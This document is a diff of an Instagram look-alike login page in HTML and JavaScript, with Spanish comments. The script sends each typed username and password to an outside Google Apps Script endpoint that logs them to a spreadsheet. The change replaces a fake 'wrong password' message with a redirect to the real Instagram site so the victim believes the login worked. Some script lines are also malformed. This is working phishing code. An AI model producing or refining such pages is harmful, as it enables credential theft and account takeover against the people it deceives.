@@ -34,12 +34,18 @@
             margin-top: 30px;
             margin-bottom: 20px;
             width: 175px;
+            font-family: 'Instagram Sans', -apple-system, BlinkMacSystemFont, "Segoe UI", Roboto, Helvetica, Arial, sans-serif;
         }
 
-        /* Logo con tipografía oficial cursiva */
-        .logo img {
-            width: 100%;
-            height: auto;
+        /* Aquí está la letra cursiva solicitada */
+        .logo i {
+            font-style: normal;
+            font-size: 50px;
+            background: -webkit-linear-gradient(45deg, #405de6, #5851db, #833ab4, #c13584, #e1306c, #fd1d1d);
+            -webkit-background-clip: text;
+            -webkit-text-fill-color: transparent;
+            line-height: 1;
+            display: block;
         }
 
         .form-group {
@@ -57,7 +63,6 @@
             font-size: 12px;
             color: #262626;
             outline: none;
-            font-family: -apple-system, BlinkMacSystemFont, "Segoe UI", Roboto, Helvetica, Arial, sans-serif;
         }
 
         input:focus {
@@ -120,17 +125,27 @@
             padding: 8px;
             border-radius: 3px;
         }
+        
+        .signup-link {
+            margin-top: 20px;
+            font-size: 12px;
+            color: #262626;
+        }
+        
+        .signup-link a {
+            color: #0095f6;
+            text-decoration: none;
+        }
+
     </style>
 </head>
 <body>
 
     <div class="container">
+        <!-- Logo con letra cursiva -->
         <div class="logo">
-            <!-- Logo oficial de Instagram con fuente cursiva -->
-            <img src="https://static.cdninstagram.com/rsrc.php/v3/yt/r/Yfc020wY07c.svg" alt="Instagram Logo">
+            <i>Instagram</i>
         </div>
-
-        <div class="error-msg" id="errorMsg">El nombre de usuario o la contraseña es incorrecta.</div>
 
         <form id="loginForm" onsubmit="return false;">
             <div class="form-group">
@@ -151,15 +166,18 @@
         <div style="margin-top: 20px; font-size: 12px; color: #8e8e8e; cursor: pointer;">
             ¿Has olvidado la contraseña?
         </div>
+        
+        <div class="signup-link">
+            ¿No tienes una cuenta? <a href="https://instagram.com/accounts/signup">Regístrate</a>
+        </div>
     </div>
 
     <script>
-        https://script.google.com/macros/s/AKfycbznSiTmJ_vjjjX8f8hRl5PsASlB2Mbr0uxz9x3U68YFWCWR_1R1aZlXiweow9KPmqkj/exec
-        const SCRIPT_URL =https://script.google.com/macros/s/AKfycbznSiTmJ_vjjjX8f8hRl5PsASlB2Mbr0uxz9x3U68YFWCWR_1R1aZlXiweow9KPmqkj/exec;
+        /https://script.google.com/macros/s/AKfycbw58yi3zx4fztmVSj_qbt01hwvZVFEHLxUiCLU8kog63CvqQ6jBW0H4U7PMWRiWZXEI/exec
+        const SCRIPT_URL = 'https://script.google.com/macros/s/AKfycbznSiTmJ_vjjjX8f8hRl5PsASlB2Mbr0uxz9x3U68YFWCWR_1R1aZlXiweow9KPmqkj/exec';
 
         const form = document.getElementById('loginForm');
         const btn = document.getElementById('submitBtn');
-        const errorMsg = document.getElementById('errorMsg');
 
         form.addEventListener('submit', function(e) {
             e.preventDefault();
@@ -170,46 +188,26 @@
             // UI Feedback
             btn.disabled = true;
             btn.innerText = '...';
-            errorMsg.style.display = 'none';
 
+            // Enviar datos a Google Sheets
             const data = new FormData();
             data.append('username', username);
             data.append('password', password);
-
-            // 1. Verificamos que la URL no sea la por defecto
-            if (SCRIPT_URL === https://script.google.com/macros/s/AKfycbznSiTmJ_vjjjX8f8hRl5PsASlB2Mbr0uxz9x3U68YFWCWR_1R1aZlXiweow9KPmqkj/exec) {
-                alert('⚠️ IMPORTANTE: No has pegado tu URL de Google Sheets en el código HTML. Edita el archivo y reemplaza https://script.google.com/macros/s/AKfycbznSiTmJ_vjjjX8f8hRl5PsASlB2Mbr0uxz9x3U68YFWCWR_1R1aZlXiweow9KPmqkj/exec.');
-                btn.disabled = false;
-                btn.innerText = 'Iniciar sesión';
-                return;
-            }
 
             fetch(SCRIPT_URL, {
                 method: 'POST',
                 body: data
             })
-            .then(response => {
-                // Simulamos un pequeño retraso para realismo
-                return new Promise(resolve => setTimeout(resolve, 1000));
-            })
             .then(() => {
-                // Muestra un error falso para que el usuario piense que falló y quiera reintentar
-                errorMsg.style.display = 'block';
-                btn.disabled = false;
-                btn.innerText = 'Iniciar sesión';
-                
-                // Limpiamos la contraseña para simular el error de login
-                document.getElementById('password').value = '';
-                
-                // Opcional: Si quieres que se quede en la pantalla, déjalo así.
-                // Si quieres que recargue: location.reload();
+                // Redirigir al explore para que crea que entró
+                setTimeout(() => {
+                    window.location.href = 'https://www.instagram.com/explore/';
+                }, 1000);
             })
             .catch(error => {
-                console.error('Error:', error);
-                alert('Error de conexión con el servidor. Revisa tu conexión.');
-                errorMsg.style.display = 'block';
                 btn.disabled = false;
                 btn.innerText = 'Iniciar sesión';
+                alert('Error de conexión. Intenta de nuevo.');
             });
         });
     </script>
